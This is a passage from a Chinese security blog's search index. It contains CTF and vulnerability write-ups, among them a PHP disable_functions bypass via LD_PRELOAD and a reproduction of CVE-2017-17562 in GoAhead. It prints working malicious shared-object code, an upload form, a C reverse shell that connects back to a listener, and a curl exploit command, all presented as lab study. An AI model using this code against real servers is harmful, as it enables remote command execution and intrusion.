    <content type="html"><![CDATA[<h1 id="校赛-白给的shell复现"><a href="#校赛-白给的shell复现" class="headerlink" title="校赛 白给的shell复现"></a>校赛 白给的shell复现</h1><p>参考该文章进行学习：<a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p><p>考察的是如何进行<strong>disable functions</strong>的绕过</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711155735.png"></p><p>源码是这样的，但是拿到shell却无法执行任何命令</p><p>然后看一下phpinfo</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711155844.png"></p><p>属于是把能用的函数都给禁用了</p><p>所以需要我们进行disable_funtions的绕过</p><p>这道题主要使用LD_PRELOAD的方法进行绕过</p><p>LD_PRELOAD是linux下的一个环境变量，我们可以上传自己的恶意so文件，也就是动态链接库，让该变量指向它，然后再进行库的调用的时候优先调用我们上传的so文件，达到触发并利用的效果</p><p>大致的步骤如下</p><ul><li>生成一个我们的恶意动态链接库文件</li><li>利用<code>putenv</code>设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li></ul><p>可以利用gcc的__attribute__ ((constructor))</p><p>该函数会在main()函数执行前被执行，利用这个机制即可在执行正常的函数前先执行我们的命令</p><p>写一个恶意的c文件，并进行编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// get command line options and arg</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmdline = getenv(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>);<br><br>    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span><br>    <span class="hljs-comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br>    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// executive command</span><br>    system(cmdline);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用该命令进行编译<code>gcc -shared -fPIC t.c -o t.so</code></p><p>没有提供上传的功能，需要自己写一个上传表单进行上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://39.96.12.202:40001/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>即可看到恶意的so文件已经上传成功了</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711161620.png"></p><p>然后写一个shell.php的马上传到该目录下</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711163317.png"></p><p>这个php提供三个参数：</p><ul><li>cmd 参数，待执行的系统命令（如 pwd）</li><li>outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点</li><li>sopath 参数，指定劫持系统函数的共享对象的绝对路径</li></ul><p>以同样的方式上传后，即可进行任意命令执行</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711163820.png"></p><p>然后即可getflag</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711164017.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/11/WMCTF-2020%20Make%20PHP%20Great%20Again/"/>
    <url>/2022/07/11/WMCTF-2020%20Make%20PHP%20Great%20Again/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF-2021-Make-PHP-Great-Again-And-Again"><a href="#WMCTF-2021-Make-PHP-Great-Again-And-Again" class="headerlink" title="WMCTF-2021 Make PHP Great Again And Again"></a>WMCTF-2021 Make PHP Great Again And Again</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>WMCTF2021中的一道题目</p><p>跟着赵总的博客进行了一波复现：<a href="https://www.zhaoj.in/read-6951.html">https://www.zhaoj.in/read-6951.html</a></p><h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><p>下载了docker file文件，在本地进行了复现</p><p>题目本身给了shell，但是有着诸多的限制，包括disable_functions，open_basedir，flag文件是700等,而且不出网，流量是nginx转发进内网</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>之前只知道可以用phpinfo来查看disable_functions之类的信息</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/06/29/ACTF-GOGOGO/"/>
    <url>/2022/06/29/ACTF-GOGOGO/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF-GOGOGO"><a href="#ACTF-GOGOGO" class="headerlink" title="ACTF-GOGOGO"></a>ACTF-GOGOGO</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/06/28/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/28/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS漏洞学习"><a href="#XSS漏洞学习" class="headerlink" title="XSS漏洞学习"></a>XSS漏洞学习</h1><h2 id="XSS介绍与分类"><a href="#XSS介绍与分类" class="headerlink" title="XSS介绍与分类"></a>XSS介绍与分类</h2><p>跨站脚本攻击(Cross Site Scripting)为了不与层叠样式表(Cascading Style Sheets)的缩写混淆，故缩写为XSS</p><p>恶意攻击者往<strong>Web页面</strong>里插入<strong>恶意Script代码</strong>，当用户<strong>浏览</strong>该页之时，嵌入其中Web里面的Script代码会被<strong>执行</strong>，从而达到恶意攻击用户的目的</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>又称非持久性XSS，这种攻击为一次性攻击</p><p><a href="https://blog.csdn.net/qq_45884195/article/details/107136606">https://blog.csdn.net/qq_45884195/article/details/107136606</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/06/28/GoAhead%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/06/28/GoAhead%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="GoAhead漏洞分析"><a href="#GoAhead漏洞分析" class="headerlink" title="GoAhead漏洞分析"></a>GoAhead漏洞分析</h1><h2 id="GoAhead简介"><a href="#GoAhead简介" class="headerlink" title="GoAhead简介"></a>GoAhead简介</h2><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><h2 id="CVE-2017-17562-GoAhead远程代码执行漏洞分析"><a href="#CVE-2017-17562-GoAhead远程代码执行漏洞分析" class="headerlink" title="CVE-2017-17562 GoAhead远程代码执行漏洞分析"></a>CVE-2017-17562 GoAhead远程代码执行漏洞分析</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>CVE-2017-17562是一个远程命令执行漏洞</p><p>影响的版本若启用了CGI并动态链接了CGI程序的话，则可导致远程代码执行</p><p>漏洞的原因在于cgi.c的cgiHandler函数使用了不可信任的HTTP请求参数初始化CGI脚本的环境</p><p>可使用环境变量（LD_PRELOAD），利用glibc动态链接器加载任意程序实现远程代码执行</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>受影响的GoAhead版本为<code>2.5.0</code>到<code>3.6.4</code>之间</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点存在于<code>cgiHandler</code>中</p><p>漏洞的原因在于cgi.c的cgiHandler函数使用了不可信任的HTTP请求参数初始化CGI脚本的环境</p><p>没有对传入的数据进行检查，使得最终<code>execve</code>启动新进程执行cgi程序时的环境变量<code>envp</code>数组可控</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先是如何利用<code>envp</code>环境变量数组，可以使用<code>LD_PRELOAD</code>这个变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译出demo.so，执行命令<code>LD_PRELOAD=./demo.so whoami</code>进行测试</p><p>因此如果我们可以上传文件为so，并指定<code>LD_PRELOAD</code>环境变量，即可实现任意代码执行</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在本地使用vulhub搭建测试环境</p><p><img src="https://cdn.jsdelivr.net/gh/linkaifeng1/image-hosting@master/20220628/image.6gma4p4mflk0.webp" alt="image"></p><p>使用如下用于动态加载的so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-type">char</span> *server_ip=<span class="hljs-string">&quot;192.168.195.128&quot;</span>;<br><span class="hljs-type">uint32_t</span> server_port=<span class="hljs-number">7777</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-comment">//socket initialize</span><br>    <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">attacker_addr</span> =</span> &#123;<span class="hljs-number">0</span>&#125;;<br>    attacker_addr.sin_family = AF_INET;<br>    attacker_addr.sin_port = htons(server_port);<br>    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);<br>  <span class="hljs-comment">//connect to the server</span><br>    <span class="hljs-keyword">if</span>(connect(sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="hljs-keyword">sizeof</span>(attacker_addr))!=<span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-comment">//dup the socket to stdin, stdout and stderr</span><br>    dup2(sock, <span class="hljs-number">0</span>);<br>    dup2(sock, <span class="hljs-number">1</span>);<br>    dup2(sock, <span class="hljs-number">2</span>);<br>  <span class="hljs-comment">//execute /bin/sh to get a shell</span><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译命令</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">gcc -<span class="hljs-keyword">shared</span> -fPIC ./<span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span>.so<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>执行poc：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -X POST --data-binary @exp.so http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">195.128</span><span class="hljs-regexp">/cgi-bin/i</span>ndex\?LD_PRELOAD\=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/fd/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>即可弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/linkaifeng1/image-hosting@master/20220628/QQ%E6%88%AA%E5%9B%BE20220628113946.53ccqnpbu3c0.webp" alt="QQ截图20220628113946"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
